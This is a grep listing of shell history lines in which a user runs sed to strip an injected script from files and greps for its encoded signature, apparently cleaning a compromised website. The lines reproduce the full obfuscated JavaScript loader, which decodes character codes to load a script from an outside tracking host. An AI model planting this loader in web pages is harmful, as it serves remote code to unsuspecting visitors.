
```bash
/home/arcom/.bash_history:1438:sed -e s/<script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,116,114,97,99,107,46,100,101,118,101,108,111,112,102,105,114,115,116,108,105,110,101,46,99,111,109,47,116,46,106,115,63,113,113,115,61,50);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script>//g -i *
/home/arcom/.bash_history:1440:sed -e s/"<script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type =String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,116,114,97,99,107,46,100,101,118,101,108,111,112,102,105,114,115,116,108,105,110,101,46,99,111,109,47,116,46,106,115,63,113,113,115,61,50);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script>"//g -i *
/home/arcom/.bash_history:1448:grep -rnw ~ -e '115,99,114,105,112,116' *
/home/arcom/.bash_history:1454:grep -rnw ~ -e '115,99,114,105,112,116' *
```